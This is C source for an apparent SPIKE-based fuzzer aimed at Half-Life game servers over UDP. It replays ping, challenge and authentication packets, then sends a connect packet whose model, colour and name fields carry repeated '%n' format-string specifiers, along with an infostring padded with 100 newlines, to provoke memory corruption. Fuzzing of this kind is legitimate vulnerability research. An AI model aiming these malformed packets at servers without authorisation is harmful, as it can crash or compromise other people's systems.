/* halflife.c - the beginings of a halflife fuzzer


*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h> /*for memset*/
#include <sys/types.h>
#include <sys/socket.h>
#include <ctype.h> /*isalpha*/


#include "spike.h"
#include "hdebug.h"
#include "tcpstuff.h"
#include "udpstuff.h"

struct spike * our_spike;

void
usage()
{
  printf("Usage: ./halflife target port\r\n");
  printf("./halflife 192.168.1.101 27010\n");
  exit(-1);
}


void
read_packet()
{
  unsigned char buffer[5000];
  int i;
  int size;
  s_fd_wait();
  printf("reading packet\r\n");
  memset(buffer,0x00,sizeof(buffer));
  size=read(our_spike->fd,buffer,1500);

  for (i=0; i<size; i++)
    {
      if (isprint(buffer[i]))
	printf("%c",buffer[i]);
      else
	printf("[%2.2x]",buffer[i]);
    }

  printf("\nDone with read\n");
}


int
main (int argc, char ** argv)
{
  char * target;
  int port;
  
  
  if (argc!=3)
    {
      usage();
    }
  
  target=argv[1];
  printf("Target is %s\r\n",argv[1]);
  
  port=atoi(argv[2]);
  
  our_spike=new_spike();
  
  
  if (our_spike==NULL)
    {
      fprintf(stderr,"Malloc failed trying to allocate a spike.\r\n");
      exit(-1);
    }
  
  setspike(our_spike);
  
  
  if (spike_connect_udp(target,port)<0)
    {
      printf("Couldn't connect!\n");
      exit(-1);
    }
  
  printf("fd=%d\n",our_spike->fd);
  /*initial packet*/
  spike_clear();
  s_binary("ff ff ff ff");
  s_string("ping");
  s_binary("00");
  
  if (spike_send()<0)
    {
      printf("Couldn't send data!\r\n");
      exit(-1);
    }
  
  printf("sent ping packet\n");
  read_packet();
  
  /*infostring packet*/
  spike_clear();
  s_binary("ff ff ff ff");
  s_string("infostring");
  s_string_repeat("\n",100);
  s_string("infostring");
  s_binary("0a 00"); /*why do they use a 0a?*/
  
  if (spike_send()<0)
    {
      printf("Couldn't send data!\r\n");
      exit(-1);
    }
  printf("Sent infostring packet\n");
  /*second little packet we send*/
  read_packet();


  spike_clear();
  s_binary("ff ff ff ff");
  s_string("getchallenge");
  s_binary("0a");
  
  if (spike_send()<0)
    {
      printf("Couldn't send data!\r\n");
      exit(-1);
    }
  printf("Sent getchallenge packet\n");
  read_packet();


#if 1
  spike_clear();
  s_binary("ff ff ff ff 33 5c"   
"00 01 00 c9 3e 4c 3c 79  43 4c 3c 3f 7c 19 00 04"   
"00 00 00 01 00 3c 00 30  3a 02 0f 00 b8 a0 19 a1"   
"a8 98 16 30 87 00 e2 5b  7a 19 02 07 3e b7 58 84"   
"9d 1c 9f 02 0e 36 67 91  df b5 bc 44 f5 28 24 66"   
"43 df 0f 02 0e 3d 15 80  20 31 43 e2 14 df 6e 50"   
"48 4c 75 17 e6 f1 92 51  1e 33 5f 3f f5");
  
  if (spike_send()<0)
    {
      printf("Couldn't send data!\r\n");
      exit(-1);
    }
  printf("Sent authentication packet\n");
  read_packet();
#endif


  spike_clear();
  s_binary("ff ff ff ff");
  s_string("connect 45 -309532828 \"\\prot\\1\\unique\\1670207\\raw\\0fff94bb9cf45692\\cdkey\\9f8b6a159");
  s_string("5f762eaad6b3bda53a738c9\" \"\\cl_lb\\0.0\\model");
  s_string_repeat("%n",5);
  s_string("\\gordon");
  s_string_repeat("%n",5);

  s_string("\\topcolor\\30");
  s_string_repeat("%n",5);
/*    s_string_repeat("6",50); */
  s_string("\\bottomcolor\\6\\rate\\7500.00 0000\\cl_");
  s_string("updaterate\\20\\cl_lw\\1\\cl_lc\\1\\cl_dlmax\\128\\hud_classautokill\\1\\name\\bob");
  s_string_repeat("%n",5);
  s_string("\"");

  s_binary("0a");

  if (spike_send()<0)
    {
      printf("Couldn't send data!\r\n");
      exit(-1);
    }
  printf("Sent connect packet\n");
  read_packet();
  printf ("Done fuzzing!\n");
    
  return 0;
}







